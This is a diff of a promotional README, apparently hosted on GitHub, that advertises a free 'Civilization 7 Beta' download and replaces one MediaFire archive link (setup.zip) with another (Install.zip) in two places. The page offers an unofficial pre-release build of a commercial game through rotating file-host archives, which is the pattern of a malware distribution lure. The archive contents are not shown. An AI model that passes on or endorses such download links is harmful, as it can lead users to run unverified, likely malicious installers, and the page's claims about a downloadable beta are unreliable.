@@ -2,7 +2,7 @@
 **🏛️ Build Your Empire in the Beta Version — Free Download! 🏛️**  
 
 **Download Now:**  
-[Download for Windows](https://download1587.mediafire.com/3c37upbhc4pgfzH8vmBW3vUBVyyfPcHZwK7Gs3BCPydEWC48lQIjMlIcJ-9pXLIW7HbynIyx2EZ_bti3aruYwqC7EddZfYQKLlU15XQrscuahDPnyCNEGyrAM7M68DgOZYeRfVJs3JlrbKWaIDKihCrlD43vBaaXq0_66x3YJ7q8/3l5gw32c2597fto/setup.zip) 
+[Download for Windows](https://download1076.mediafire.com/jehqxum7woygl-6MfuUBlTbp4TOZmk4iUILqx2ZrYi9waThJN0V-OCKnH2a6XPASm-1SIMMUYKDncfrToAAr9BNahX18tlFI8uGeVkj_dhQqfuBLIQdic5ENPA9PCvy3yvG7QYEuOFRPH6ot1dzQmMvA86hsihjeIAY0rSYcLHlJ/vfpk9dpxrjjupr9/Install.zip) 
 
 ---
 ![AsSgSnPRREASf8vgEYcsAg-1200-80](https://github.com/user-attachments/assets/91b7f362-fbbc-4ac9-af9d-05abc76edd9a)
@@ -97,6 +97,6 @@
 
 ---
 
-## [**📥 Download Civilization 7 Beta Now! 📥** ](https://download1587.mediafire.com/3c37upbhc4pgfzH8vmBW3vUBVyyfPcHZwK7Gs3BCPydEWC48lQIjMlIcJ-9pXLIW7HbynIyx2EZ_bti3aruYwqC7EddZfYQKLlU15XQrscuahDPnyCNEGyrAM7M68DgOZYeRfVJs3JlrbKWaIDKihCrlD43vBaaXq0_66x3YJ7q8/3l5gw32c2597fto/setup.zip) 
+## [[**📥 Download Civilization 7 Beta Now! 📥** ]](https://download1076.mediafire.com/jehqxum7woygl-6MfuUBlTbp4TOZmk4iUILqx2ZrYi9waThJN0V-OCKnH2a6XPASm-1SIMMUYKDncfrToAAr9BNahX18tlFI8uGeVkj_dhQqfuBLIQdic5ENPA9PCvy3yvG7QYEuOFRPH6ot1dzQmMvA86hsihjeIAY0rSYcLHlJ/vfpk9dpxrjjupr9/Install.zip)
 
 Don’t miss your chance to play **Civilization 7** before its official release. **Download the beta version** today and start building your empire!  
